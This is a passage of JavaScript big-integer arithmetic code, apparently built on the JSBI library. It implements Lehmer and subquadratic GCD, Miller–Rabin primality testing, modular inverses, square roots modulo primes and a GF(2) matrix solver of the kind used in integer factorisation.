      var B1 = JSBI.BigInt(M1);
      var C1 = JSBI.BigInt(M2);
      var D1 = JSBI.BigInt(M3);

      if (step === 1) {
        var $newA = A1;
        var $newB = B1;
        var $newC = C1;
        var $newD = D1;
        A = $newA;
        B = $newB;
        C = $newC;
        D = $newD;
      } else {
        // T = T1 * T:
        var $tmpM4_M5_M6_M7 = matrixMultiply(A1, B1, C1, D1, A, B, C, D);
        var M4 = $tmpM4_M5_M6_M7[0];
        var M5 = $tmpM4_M5_M6_M7[1];
        var M6 = $tmpM4_M5_M6_M7[2];
        var M7 = $tmpM4_M5_M6_M7[3];
        A = JSBI.BigInt(M4);
        B = JSBI.BigInt(M5);
        C = JSBI.BigInt(M6);
        D = JSBI.BigInt(M7);
      }

      if (isSmall) {
        var $newa = JSBI.add(JSBI.multiply(A1, a), JSBI.multiply(B1, b));
        var $newb = JSBI.add(JSBI.multiply(C1, a), JSBI.multiply(D1, b));
        a = $newa;
        b = $newb; // T1 * (a, b)
      } else {
        var alo = JSBI.asUintN(JSBI.toNumber(m), a);
        var blo = JSBI.asUintN(JSBI.toNumber(m), b);
        var $newa = JSBI.add(JSBI.add(JSBI.multiply(A1, alo), JSBI.multiply(B1, blo)), JSBI.leftShift(transformedAhi, m));
        var $newb = JSBI.add(JSBI.add(JSBI.multiply(C1, alo), JSBI.multiply(D1, blo)), JSBI.leftShift(transformedBhi, m));
        a = $newa;
        b = $newb; // T * (alo, blo) + T * (ahi, bhi) * 2**m
      }

      console.assert(JSBI.greaterThan(a, JSBI.BigInt(0)) && JSBI.greaterThanOrEqual(b, JSBI.BigInt(0)));

      if (JSBI.equal(B1, JSBI.BigInt(0))) {
        console.assert(JSBI.equal(A1, JSBI.BigInt(1)) && JSBI.equal(B1, JSBI.BigInt(0)) && JSBI.equal(C1, JSBI.BigInt(0)) && JSBI.equal(D1, JSBI.BigInt(1)));

        if (JSBI.notEqual(b, JSBI.BigInt(0))) {
          //TODO: ?
          var q = JSBI.divide(JSBI.BigInt(a), b);
          var C2 = JSBI.subtract(A, JSBI.multiply(q, C)),
                D2 = JSBI.subtract(B, JSBI.multiply(q, D)),
                b1 = JSBI.subtract(a, JSBI.multiply(q, b));
          var sameQuotient = JSBI.greaterThanOrEqual(JSBI.add(b1, C2), JSBI.BigInt(0)) && JSBI.lessThan(JSBI.add(b1, C2), JSBI.add(b, C)) && JSBI.greaterThanOrEqual(JSBI.add(b1, D2), JSBI.BigInt(0)) && JSBI.lessThan(JSBI.add(b1, D2), JSBI.add(b, D));

          if (!sameQuotient) {
            return [A, B, C, D, a, b];
          }

          var $newA = C;
          var $newB = D;
          var $newC = C2;
          var $newD = D2;
          A = $newA;
          B = $newB;
          C = $newC;
          D = $newD; // {{0, 1}, {1, -q}} * T

          var $newa = b;
          var $newb = b1;
          a = $newa;
          b = $newb; // {{0, 1}, {1, -q}} * (a, b)
          //gcd.debug(q);
        } else {
          return [A, B, C, D, a, b];
        }
      }
    } // see "2. General structure of subquadratic gcd algorithms" in â€œOn SchÃ¶nhageâ€™s algorithm and subquadratic integer GCD computationâ€ by MÃ¶ller


    return [A, B, C, D, a, b]; // for performance transformedA and transformedB are returned
  }

  var SUBQUADRATIC_GCD_THRESHOLD = 32 * 1024;
  var LEHMERS_ALGORITHM_THRESHOLD = JSBI.BigInt(Math.pow(2, 68)); // https://en.wikipedia.org/wiki/Lehmer%27s_GCD_algorithm
  // https://www.imsc.res.in/~kapil/crypto/notes/node11.html
  // this implementation is good after ~80 bits (?)

  function LehmersGCD(a, b) {
    if (JSBI.lessThan(a, b)) {
      var tmp = a;
      a = b;
      b = tmp;
    } // Subquadratic Lehmer's algorithm:


    while (JSBI.lessThan(JSBI.asUintN(SUBQUADRATIC_GCD_THRESHOLD, b), b)) {
      //console.assert(a >= b);
      var n = bitLength(a);
      var m = JSBI.BigInt(Math.floor(n / 2));
      var $tmpA1_B1_C1_D1_transformedAhi_transformedBhi = halfgcd(JSBI.signedRightShift(a, m), JSBI.signedRightShift(b, m), false);
      var A1 = $tmpA1_B1_C1_D1_transformedAhi_transformedBhi[0];
      var B1 = $tmpA1_B1_C1_D1_transformedAhi_transformedBhi[1];
      var C1 = $tmpA1_B1_C1_D1_transformedAhi_transformedBhi[2];
      var D1 = $tmpA1_B1_C1_D1_transformedAhi_transformedBhi[3];
      var transformedAhi = $tmpA1_B1_C1_D1_transformedAhi_transformedBhi[4];
      var transformedBhi = $tmpA1_B1_C1_D1_transformedAhi_transformedBhi[5];

      if (JSBI.equal(B1, JSBI.BigInt(0))) {
        //console.assert(A1 === 1n && B1 === 0n && C1 === 0n && D1 === 1n);
        //gcd.debug(a / b);
        var $newa = b;
        var $newb = JSBI.remainder(a, b);
        a = $newa;
        b = $newb;
      } else {
        var alo = JSBI.asUintN(JSBI.toNumber(m), a);
        var blo = JSBI.asUintN(JSBI.toNumber(m), b);
        var $newa = JSBI.add(JSBI.add(JSBI.multiply(A1, alo), JSBI.multiply(B1, blo)), JSBI.leftShift(transformedAhi, m));
        var $newb = JSBI.add(JSBI.add(JSBI.multiply(C1, alo), JSBI.multiply(D1, blo)), JSBI.leftShift(transformedBhi, m));
        a = $newa;
        b = $newb; // T * (alo, blo) + T * (ahi, bhi) * 2**m

        if (JSBI.lessThan(a, JSBI.BigInt(0)) || JSBI.lessThan(b, JSBI.BigInt(0))) {
          throw new TypeError("assertion");
        }
      }
    } // Lehmer's algorithm:


    while (JSBI.greaterThanOrEqual(b, LEHMERS_ALGORITHM_THRESHOLD)) {
      //console.assert(a >= b);
      var n = bitLength2(a);
      var m = JSBI.BigInt(Math.max(0, n - DIGITSIZE * (doubleDigitMethod ? 2 : 1)));
      var $tmpA1_B1_C1_D1 = helper(JSBI.signedRightShift(a, m), JSBI.signedRightShift(b, m));
      var A1 = $tmpA1_B1_C1_D1[0];
      var B1 = $tmpA1_B1_C1_D1[1];
      var C1 = $tmpA1_B1_C1_D1[2];
      var D1 = $tmpA1_B1_C1_D1[3];

      if (JSBI.equal(B1, JSBI.BigInt(0))) {
        //console.assert(A1 === 1n && B1 === 0n && C1 === 0n && D1 === 1n);
        //gcd.debug(a / b);
        var $newa = b;
        var $newb = JSBI.remainder(a, b);
        a = $newa;
        b = $newb;
      } else {
        var $newa = JSBI.add(JSBI.multiply(A1, a), JSBI.multiply(B1, b));
        var $newb = JSBI.add(JSBI.multiply(C1, a), JSBI.multiply(D1, b));
        a = $newa;
        b = $newb; // T * (a, b)

        if (JSBI.lessThan(a, JSBI.BigInt(0)) || JSBI.lessThan(b, JSBI.BigInt(0))) {
          throw new TypeError("assertion");
        }
      }
    }

    return EuclidsGCD(a, b);
  }

  function abs(a) {
    return JSBI.lessThan(a, JSBI.BigInt(0)) ? JSBI.unaryMinus(a) : a;
  }

  function numberCTZ(a) {
    return 32 - (Math.clz32(a & -a) + 1);
  }

  function ctz(a) {
    var test = JSBI.asUintN(32, a);

    if (JSBI.notEqual(test, JSBI.BigInt(0))) {
      return numberCTZ(JSBI.toNumber(test));
    }

    var k = 32;

    while (JSBI.equal(JSBI.asUintN(k, a), JSBI.BigInt(0))) {
      k *= 2;
    }

    var n = 0;

    for (var i = Math.floor(k / 2); i >= 32; i = Math.floor(i / 2)) {
      if (JSBI.equal(JSBI.asUintN(i, a), JSBI.BigInt(0))) {
        n += i;
        a = JSBI.signedRightShift(a, JSBI.BigInt(i));
      } else {
        a = JSBI.asUintN(i, a);
      }
    }

    n += numberCTZ(JSBI.toNumber(JSBI.BigInt(JSBI.asUintN(32, a))));
    return n;
  }

  function bigIntGCD(a, b) {
    var A = abs(JSBI.BigInt(a));
    var B = abs(JSBI.BigInt(b));
    var na = JSBI.toNumber(A);
    var nb = JSBI.toNumber(B);

    if (Math.max(na, nb) <= Number.MAX_SAFE_INTEGER) {
      return JSBI.BigInt(numbersGCD(na, nb));
    }

    var abmin = Math.min(na, nb);

    if (abmin <= Number.MAX_SAFE_INTEGER) {
      if (abmin === 0) {
        return JSBI.add(A, B);
      }

      if (abmin === 1) {
        return JSBI.BigInt(1);
      }

      return JSBI.BigInt(numbersGCD(abmin, Math.abs(JSBI.toNumber(na < nb ? JSBI.remainder(B, A) : JSBI.remainder(A, B)))));
    }

    if (i64gcd != null && Math.max(na, nb) < Math.pow(2, 64)) {
      return JSBI.asUintN(64, i64gcd(A, B));
    }

    if (abmin > (Number.MAX_SAFE_INTEGER + 1) * (1 << 11)) {
      var c1 = ctz(A);
      var c2 = ctz(B);

      if (c1 + c2 >= 4) {
        var g = LehmersGCD(c1 === 0 ? A : JSBI.signedRightShift(A, JSBI.BigInt(c1)), c2 === 0 ? B : JSBI.signedRightShift(B, JSBI.BigInt(c2)));
        var c = Math.min(c1, c2);
        return c === 0 ? g : JSBI.leftShift(JSBI.BigInt(g), JSBI.BigInt(c));
      }
    }

    return LehmersGCD(A, B);
  }

  self.bigIntGCD = bigIntGCD;
})();


(function () {
  "use strict";

  function log2(x) {
    return JSBI.BigInt(x.toString(16).length * 4);
  }

  function modPow(base, exponent, modulus) {
    var accumulator = JSBI.BigInt(1);

    while (JSBI.notEqual(exponent, JSBI.BigInt(0))) {
      if (JSBI.equal(JSBI.asUintN(1, exponent), JSBI.BigInt(1))) {
        exponent = JSBI.subtract(exponent, JSBI.BigInt(1));
        accumulator = JSBI.remainder(JSBI.multiply(accumulator, base), modulus);
      }

      exponent = JSBI.signedRightShift(exponent, JSBI.BigInt(1));
      base = JSBI.remainder(JSBI.multiply(base, base), modulus);
    }

    return accumulator;
  }

  function fmod(a, b) {
    return a - Math.floor(a / b) * b;
  }

  function FastModBigInt(a) {
    var array = [];

    while (JSBI.notEqual(a, JSBI.BigInt(0))) {
      var x = JSBI.toNumber(JSBI.asUintN(52, a));
      array.push(x);
      a = JSBI.signedRightShift(a, JSBI.BigInt(52));
    }

    return array;
  }

  function FastMod(array, integer) {
    var n = array.length - 1;
    var result = fmod(array[n], integer);

    if (n > 0) {
      var x = fmod(Math.pow(2, 52), integer);

      for (var i = n - 1; i >= 0; i -= 1) {
        result = fmod(result * x + array[i], integer);
      }
    }

    return result | 0;
  }

  function isPrime(n) {
    if (!(n instanceof JSBI)) {
      throw new RangeError();
    }

    if (JSBI.lessThan(n, JSBI.BigInt(2))) {
      throw new RangeError();
    }

    var s = JSBI.toNumber(JSBI.remainder(n, JSBI.BigInt(30)));

    if (s % 2 === 0) {
      return JSBI.equal(n, JSBI.BigInt(2));
    }

    if (s % 3 === 0) {
      return JSBI.equal(n, JSBI.BigInt(3));
    }

    if (s % 5 === 0) {
      return JSBI.equal(n, JSBI.BigInt(5));
    }

    var wheel3 = [0, 4, 6, 10, 12, 16, 22, 24, 24];
    var N = FastModBigInt(n);

    for (var i = 7, max = Math.min(1024, Math.floor(Math.sqrt(JSBI.toNumber(n)))); i <= max; i += 30) {
      for (var j = 0; j < wheel3.length; j += 1) {
        var p = i + wheel3[j];

        if (FastMod(N, p) === 0) {
          return false;
        }
      }
    }

    if (JSBI.toNumber(n) < 1024 * 1024) {
      return true;
    } // https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test#Deterministic_variants


    var r = 0;
    var d = JSBI.subtract(n, JSBI.BigInt(1));

    while (JSBI.equal(JSBI.remainder(d, JSBI.BigInt(2)), JSBI.BigInt(0))) {
      d = JSBI.divide(d, JSBI.BigInt(2));
      r += 1;
    } // https://en.wikipedia.org/wiki/Millerâ€“Rabin_primality_test#Testing_against_small_sets_of_bases


    var values = [10, 20, 24, 31, 40, 41, 48, 48, 61, 61, 61, 78, 81];
    var primes = [2, 3, 5, 7, 11, 13, 17, 17, 19, 19, 19, 23, 29];
    var i = 0;
    var x = Math.ceil(Math.log2(JSBI.toNumber(n)));

    while (x > values[i] && i < values.length) {
      i += 1;
    }

    var bases = null;

    if (i < values.length) {
      bases = primes.slice(0, i + 1);
    } else {
      var lnN = JSBI.toNumber(log2(n)) * Math.log(2);
      var max = Math.floor(2 * lnN * Math.log(lnN));
      var range = new Array(max - 2 + 1);

      for (var i = 2; i <= max; i += 1) {
        range[i - 2] = i;
      }

      bases = range;
    }

    for (var iteratora = bases[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
      var x = modPow(JSBI.BigInt(a), d, n);

      if (JSBI.notEqual(x, JSBI.BigInt(1))) {
        for (var i = r - 1; i > 0 && JSBI.notEqual(x, JSBI.subtract(n, JSBI.BigInt(1))); i -= 1) {
          x = JSBI.remainder(JSBI.multiply(x, x), n);
        }

        if (JSBI.notEqual(x, JSBI.subtract(n, JSBI.BigInt(1)))) {
          return false;
        }
      }
    }

    return true;
  }

  self.isPrime = isPrime;
})();
var maybeJSBI = {
  toNumber: function toNumber(a) {
    return typeof a === "object" ? JSBI.toNumber(a) : Number(a);
  },
  add: function add(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.add(a, b) : a + b;
  },
  subtract: function subtract(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.subtract(a, b) : a - b;
  },
  multiply: function multiply(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.multiply(a, b) : a * b;
  },
  divide: function divide(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.divide(a, b) : a / b;
  },
  remainder: function remainder(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.remainder(a, b) : a % b;
  },
  exponentiate: function exponentiate(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.exponentiate(a, b) : typeof a === "bigint" && typeof b === "bigint" ? new Function("a", "b", "return a**b")(a, b) : Math.pow(a, b);
  },
  leftShift: function leftShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.leftShift(a, b) : a << b;
  },
  signedRightShift: function signedRightShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.signedRightShift(a, b) : a >> b;
  },
  bitwiseAnd: function bitwiseAnd(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseAnd(a, b) : a & b;
  },
  bitwiseOr: function bitwiseOr(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseOr(a, b) : a | b;
  },
  bitwiseXor: function bitwiseXor(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseXor(a, b) : a ^ b;
  },
  lessThan: function lessThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThan(a, b) : a < b;
  },
  greaterThan: function greaterThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThan(a, b) : a > b;
  },
  lessThanOrEqual: function lessThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThanOrEqual(a, b) : a <= b;
  },
  greaterThanOrEqual: function greaterThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThanOrEqual(a, b) : a >= b;
  },
  equal: function equal(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.equal(a, b) : a === b;
  },
  notEqual: function notEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.notEqual(a, b) : a !== b;
  },
  unaryMinus: function unaryMinus(a) {
    return typeof a === "object" ? JSBI.unaryMinus(a) : -a;
  },
  bitwiseNot: function bitwiseNot(a) {
    return typeof a === "object" ? JSBI.bitwiseNot(a) : ~a;
  }
};


(function () {
  "use strict";
  /*jshint esversion:6*/

  function modInverse(a, m) {
    if (!(a instanceof JSBI) || !(m instanceof JSBI)) {
      throw new TypeError();
    }

    if (JSBI.lessThan(a, JSBI.BigInt(0)) || JSBI.greaterThanOrEqual(a, m) || JSBI.lessThanOrEqual(m, JSBI.BigInt(0))) {
      throw new RangeError();
    } // We use the extended Euclidean algorithm:


    var oldR = a;
    var r = m;
    var oldS = JSBI.BigInt(1);
    var s = JSBI.BigInt(0);

    while (JSBI.notEqual(r, JSBI.BigInt(0))) {
      var q = JSBI.divide(JSBI.subtract(oldR, JSBI.remainder(oldR, r)), r); // floor(oldR / r)

      var newR = JSBI.subtract(oldR, JSBI.multiply(q, r));
      oldR = r;
      r = newR;
      var newS = JSBI.subtract(oldS, JSBI.multiply(q, s));
      oldS = s;
      s = newS;
    }

    if (JSBI.notEqual(oldR, JSBI.BigInt(1))) {
      return JSBI.BigInt(0);
    }

    return JSBI.lessThan(oldS, JSBI.BigInt(0)) ? JSBI.add(oldS, m) : oldS;
  }

  function modInverseSmall(a, m) {
    if (typeof a !== 'number' || typeof m !== 'number') {
      throw new TypeError();
    }

    var maxSMI = ~(-1 << 30);

    if (a < 0 || a >= m || m <= 0 || m > maxSMI) {
      throw new RangeError();
    } // We use the extended Euclidean algorithm:


    var oldR = a & maxSMI;
    var r = m & maxSMI;
    var oldS = 1;
    var s = 0;

    while (r !== 0) {
      var q = Math.floor(oldR / r);
      var newR = oldR % r;
      oldR = r;
      r = newR;
      var newS = oldS - q * s;
      oldS = s;
      s = newS;
    }

    if (oldR !== 1) {
      return 0;
    }

    return oldS < 0 ? oldS + m : oldS;
  }

  function ChineseRemainderTheorem(r1, r2, m1, m2) {
    // https://en.wikipedia.org/wiki/Chinese_remainder_theorem#Case_of_two_moduli
    // x = r1 (mod m1)
    // x = r2 (mod m2)
    var c = modInverse(maybeJSBI.remainder(m1, m2), m2);
    return JSBI.add(r1, JSBI.multiply(JSBI.remainder(JSBI.multiply(maybeJSBI.subtract(r2, r1), c), m2), m1));
  }

  function squareRootsModuloOddPrimesProduct(n, primes, e) {
    e = e == undefined ? 1 : e; // Chinese Remainder Theorem idea from https://en.wikipedia.org/wiki/Quadratic_residue#Complexity_of_finding_square_roots

    var result = [];
    result.push(JSBI.BigInt(0));
    var P = JSBI.BigInt(1);

    for (var i = 0; i < primes.length; i += 1) {
      if (Math.pow(primes[i], e) > Number.MAX_SAFE_INTEGER) {
        throw new RangeError();
      }

      var x2 = JSBI.BigInt(squareRootModuloOddPrime(JSBI.toNumber(JSBI.remainder(n, JSBI.BigInt(Math.pow(primes[i], e)))), primes[i], e));
      var result2 = [];
      var p = JSBI.BigInt(Math.pow(primes[i], e));

      for (var j = 0; j < result.length; j += 1) {
        var x1 = result[j];
        result2.push(ChineseRemainderTheorem(x1, x2, P, p));
        result2.push(ChineseRemainderTheorem(x1, JSBI.unaryMinus(x2), P, p));
      }

      P = JSBI.multiply(P, p);
      result = result2;
    }

    return result;
  }

  function getSquareRootsModuloTwo(n, e) {
    e = e == undefined ? 1 : e;

    if (e >= 3) {
      if (n % 8 === 1) {
        // from Cohen H.
        var m = Math.pow(2, e);
        var candidate = maybeJSBI.toNumber(getSquareRootsModuloTwo(n, e - 1)[0]);
        var candidate2 = m / 4 - candidate;
        var r = maybeJSBI.multiply(candidate, candidate) % m !== n ? candidate2 : candidate;
        return [r, m / 2 - r, m / 2 + r, m - r];
      }

      return [];
    }

    if (e >= 2) {
      if (n % 4 === 1) {
        return [1, 3];
      }

      return [];
    }

    if (e >= 1) {
      return [1];
    }

    return [];
  }

  function squareRootModuloOddPrime(n, p, e) {
    e = e == undefined ? 1 : e; // slow for non-small p

    if (typeof n !== 'number' || typeof p !== 'number' || typeof e !== 'number') {
      throw new TypeError();
    }

    var m = Math.pow(p, e);
    n = n % m;

    if (!(n > 0 && p > 0 && e >= 1 && maybeJSBI.remainder(n, p) !== 0 && m < Math.floor(Math.sqrt(Number.MAX_SAFE_INTEGER * 4)))) {
      // + p is a prime number
      throw new RangeError();
    }

    if (p % 2 === 0) {
      throw new RangeError();
    } // r**2 == n (mod p)


    if (e > 1) {
      var x = squareRootModuloOddPrime(n, p, e - 1); // x**2 = n mod p**(e - 1)
      // x1 = x + a * p**(e-1)
      // x1**2 = x**2 + (a * p**(e-1))**2 + 2*x*a*p**(e-1) = n mod p**e
      // a*p**(e-1) = (n - x**2) * (2*x)**-1 mod p**e

      var inv = modInverseSmall(2 * x, m) % m;
      var v = (n - x * x) % m;
      inv = inv > m / 2 ? inv - m : inv; // use sign bit

      v = v > m / 2 ? v - m : v; // use sign bit

      var x1 = x + v * inv % m;

      if (x1 >= m) {
        x1 -= m;
      }

      if (x1 < 0) {
        x1 += m;
      }

      if (x1 > m - x1) {
        x1 = m - x1;
      }

      return x1;
    }

    if ((p + 1) % 4 === 0) {
      // from https://en.wikipedia.org/wiki/Quadratic_residue#Prime_or_prime_power_modulus :
      var r = modPowSmall(n, (p + 1) / 4, p);

      if (r * r % p === n) {
        if (r > p - r) {
          r = p - r;
        }

        return r;
      }
    }

    var rrmnmodp = 1 - n; // r**2 % p - n

    for (var tworm1 = -1; tworm1 < p; tworm1 += 2) {
      rrmnmodp += tworm1;

      if (rrmnmodp >= p) {
        rrmnmodp -= p;
      }

      if (rrmnmodp === 0) {
        var r = Math.floor((tworm1 + 1) / 2);
        return r;
      }
    }

    throw new RangeError();
  }

  function bitLength(x) {
    return JSBI.BigInt(x.toString(16).length * 4);
  }

  function sqrt(x) {
    if (JSBI.lessThan(x, JSBI.BigInt((Number.MAX_SAFE_INTEGER + 1) / 2))) {
      return JSBI.BigInt(Math.floor(Math.sqrt(JSBI.toNumber(JSBI.BigInt(x)) + 0.5)));
    }

    var q = JSBI.divide(bitLength(x), JSBI.BigInt(4));
    var initialGuess = JSBI.leftShift(JSBI.add(sqrt(JSBI.signedRightShift(x, JSBI.multiply(q, JSBI.BigInt(2)))), JSBI.BigInt(1)), q);
    var a = initialGuess;
    var b = JSBI.add(a, JSBI.BigInt(1));

    while (JSBI.lessThan(a, b)) {
      b = a;
      a = JSBI.divide(JSBI.add(b, JSBI.divide(x, b)), JSBI.BigInt(2));
    }

    return b;
  }

  function getSmoothFactorization(a, base) {
    var value = JSBI.BigInt(a);

    if (JSBI.equal(value, JSBI.BigInt(0))) {
      return [];
    }

    var result = [];

    if (JSBI.lessThan(value, JSBI.BigInt(0))) {
      result.push(-1);
      value = JSBI.unaryMinus(value);
    }

    var i = 0;
    var fastValue = FastModBigInt(value);
    var isBig = JSBI.greaterThan(value, JSBI.BigInt(Number.MAX_SAFE_INTEGER));

    while (i < base.length && isBig) {
      var p = base[i];

      while (FastMod(fastValue, p) === 0) {
        value = JSBI.divide(value, JSBI.BigInt(p));
        fastValue = FastModBigInt(value);
        isBig = JSBI.greaterThan(value, JSBI.BigInt(Number.MAX_SAFE_INTEGER));
        result.push(p);
      }

      i += 1;
    }

    var n = JSBI.toNumber(value);

    while (i < base.length) {
      var p = base[i];

      while (n - Math.floor(n / p) * p === 0) {
        n /= p;
        result.push(p);
      }

      if (n !== 1 && n < maybeJSBI.multiply(p, p)) {
        // n should be prime (?)
        var index = indexOf(base, n);

        if (index === -1) {
          return null;
        }

        result.push(n);
        return result;
      }

      i += 1;
    }

    return n === 1 ? result : null;
  } // (X**2 - Y) % N === 0, where Y is a smooth number


  function CongruenceOfsquareOfXminusYmoduloN(X, Y, N, factorization) {
    this.X = X;
    this.Y = Y;
    this.N = N;
    this.factorization = factorization;
  }

  CongruenceOfsquareOfXminusYmoduloN.prototype.toString = function () {
    var X = this.X;
    var Y = this.Y;
    var N = this.N;
    return 'X**2 â‰¡ Y (mod N), Y = F'.replaceAll('X', X).replaceAll('Y', Y).replaceAll('N', N).replaceAll('F', this.factorization.join(' * '));
  };

  function isQuadraticResidueModuloPrime(a, p) {
    if (!(a instanceof JSBI) || typeof p !== 'number') {
      throw new TypeError();
    }

    if (p === 2) {
      // "Modulo 2, every integer is a quadratic residue." - https://en.wikipedia.org/wiki/Quadratic_residue#Prime_modulus
      return true;
    } // https://en.wikipedia.org/wiki/Euler%27s_criterion


    var amodp = JSBI.toNumber(JSBI.remainder(JSBI.BigInt(a), JSBI.BigInt(p)));

    if (amodp === 0) {
      return true;
    }

    console.assert(p % 2 === 1);
    var value = modPowSmall(amodp, (p - 1) / 2, p);
    console.assert(value === 1 || value === p - 1);
    return value === 1;
  }

  function log(N) {
    var e = Math.max(JSBI.toNumber(bitLength(N)) - 4 * 12, 0);
    var lnn = Math.log(JSBI.toNumber(JSBI.signedRightShift(N, JSBI.BigInt(e)))) + Math.log(2) * e;
    return lnn;
  }

  function L(N) {
    // exp(sqrt(log(n)*log(log(n))))
    var lnn = log(N);
    return Math.exp(Math.sqrt(lnn * Math.log(lnn)));
  }

  function product(array) {
    var n = array.length;
    var m = Math.floor(n / 2);
    return n === 0 ? JSBI.BigInt(1) : n === 1 ? JSBI.BigInt(array[0]) : maybeJSBI.multiply(product(array.slice(0, m)), product(array.slice(m)));
  }

  function modPowSmall(base, exponent, modulus) {
    if (typeof base !== 'number' || typeof exponent !== 'number' || typeof modulus !== 'number') {
      throw new TypeError();
    }

    if (Math.max(Math.pow(modulus, 2), Math.pow(base, 2)) > Number.MAX_SAFE_INTEGER) {
      throw new RangeError();
    }

    var accumulator = 1;

    while (exponent !== 0) {
      if (exponent % 2 === 0) {
        exponent /= 2;
        base = maybeJSBI.multiply(base, base) % modulus;
      } else {
        exponent -= 1;
        accumulator = accumulator * base % modulus;
      }
    }

    return accumulator;
  }

  function primes(MAX) {
    // Note: it is slow in Chrome to create array this way when MAX >= 2**25
    var sieve = new Array(MAX + 1).fill(true);
    var result = [];
    result.push(2);

    for (var i = 3; i <= MAX; i += 2) {
      if (sieve[i]) {
        result.push(i);

        for (var j = i * i; j <= MAX; j += 2 * i) {
          sieve[j] = false;
        }
      }
    }

    return result;
  }

  var BitSetWordSize = 31; // see https://v8.dev/blog/pointer-compression

  function packedArray(n) {
    // `%DebugPrint(array)` in `node --allow-native-syntax`
    // see https://v8.dev/blog/elements-kinds
    var array = [];

    for (var i = 0; i < n; i += 1) {
      array.push(0);
    }

    return array.slice(0); // slice to reduce the size of the internal storage
  }

  function BitSet(size) {
    var n = Math.ceil(size / (4 * BitSetWordSize)) * 4;
    this.data = packedArray(n);
    this.size = size;
  }

  BitSet.prototype.nextSetBit = function (index) {
    if (maybeJSBI.greaterThanOrEqual(index, this.size)) {
      return -1;
    }

    var data = this.data;
    var q = Math.floor(index / BitSetWordSize);
    var r = index % BitSetWordSize;
    var x = data[q] >> r;

    while (x === 0) {
      q += 1;

      if (q === data.length) {
        return -1;
      }

      x = data[q];
      r = 0;
    } // https://stackoverflow.com/questions/61442006/whats-the-most-efficient-way-of-getting-position-of-least-significant-bit-of-a


    r += 31 - Math.clz32(x & maybeJSBI.unaryMinus(x));
    return q * BitSetWordSize + r;
  };

  BitSet.prototype.toggle = function (index) {
    if (maybeJSBI.greaterThanOrEqual(index, this.size)) {
      throw new RangeError();
    }

    var q = Math.floor(index / BitSetWordSize);
    var r = index % BitSetWordSize;
    this.data[q] ^= r === BitSetWordSize - 1 ? -1 << r : 1 << r;
  };

  BitSet.prototype.xor = function (other) {
    var a = this.data;
    var b = other.data;
    var n = a.length;

    if (maybeJSBI.notEqual(n, b.length) || n % 4 !== 0) {
      throw new RangeError();
    }

    for (var i = 0; i < n; i += 4) {
      var _y, _y2, _y3, _y4;

      _y = i + 0, a[_y] = maybeJSBI.bitwiseXor(a[_y], b[i + 0]);
      _y2 = i + 1, a[_y2] = maybeJSBI.bitwiseXor(a[_y2], b[i + 1]);
      _y3 = i + 2, a[_y3] = maybeJSBI.bitwiseXor(a[_y3], b[i + 2]);
      _y4 = i + 3, a[_y4] = maybeJSBI.bitwiseXor(a[_y4], b[i + 3]);
    }
  };

  BitSet.prototype.toString = function () {
    return this.data.map(function (x) {
      return (x >>> 0).toString(2).padStart(BitSetWordSize, '0').split('').reverse().join('');
    }).join('').slice(0, this.size);
  }; // pass factorizations with associated values to the next call
  // returns linear combinations of vectors which result in zero vector by modulo 2
  // (basis of the kernel of the matrix)


  function solve(matrixSize) {
    // We build the augmented matrix in row-echelon form with permuted rows, which can grow up to matrixSize rows:
    // The augmented matrix is stored in the lower triangle!
    var M = new Array(matrixSize).fill(null); // We will fill the matrix so pivot elements will be placed on the diagonal

    var associatedValues = new Array(matrixSize).fill(undefined);
    var nextSolution = null;
    var state = 1;
    var iterator = {
      next: function solve(tmp) {
        while (true) {
          if (state === 1) {
            state = 0;
            return {
              value: nextSolution,
              done: false
            };
          }

          state = 1;
          var $tmprawRow_associatedValue = tmp;
          var rawRow = $tmprawRow_associatedValue[0];
          var associatedValue = $tmprawRow_associatedValue[1];
          var row = new BitSet(matrixSize);
          var reverseColumns = true; // makes it much faster when the data is more dense from the beginning (?)

          for (var j = 0; j < rawRow.length; j += 1) {
            var unitaryColumn = rawRow[j];
            var c = reverseColumns ? matrixSize - 1 - unitaryColumn : unitaryColumn;
            row.toggle(c);
          } // add row to the matrix maintaining it to be in row-echelon form:


          for (var pivotColumn = row.nextSetBit(0); pivotColumn !== -1 && row != null; pivotColumn = row == null ? -1 : row.nextSetBit(pivotColumn + 1)) {
            var pivotRow = M[pivotColumn];

            if (pivotRow != null) {
              // row-reduction:
              row.xor(pivotRow);
              console.assert(maybeJSBI.greaterThan(row.nextSetBit(pivotColumn), pivotColumn) || row.nextSetBit(pivotColumn) === -1);
              row.toggle(pivotColumn);
            } else {
              //row.toggle(matrixSize + pivotColumn);
              associatedValues[pivotColumn] = associatedValue;
              M[pivotColumn] = row;
              row = null;
            }
          }

          if (row != null) {
            // row has a solution
            // extract solution from the augmented part of the matrix:
            var solution = [];

            for (var i = row.nextSetBit(0); i !== -1; i = row.nextSetBit(i + 1)) {
              solution.push(associatedValues[i]);
            }

            solution.push(associatedValue);
            nextSolution = solution;
          } else {
            nextSolution = null;
          }
        } //console.log(M.filter(function (x) { return x != null; }).map(function (x) { return x.toString(); }).join('\n').replaceAll('0', ' '))

      }
    };

    iterator[globalThis.Symbol.iterator] = function () {
      return this;
    };

    return iterator;
  } //!copy-paste


  function fmod(a, b) {
    return a - Math.floor(a / b) * b;
  }

  function FastModBigInt(a) {
    var array = [];

    while (JSBI.notEqual(a, JSBI.BigInt(0))) {
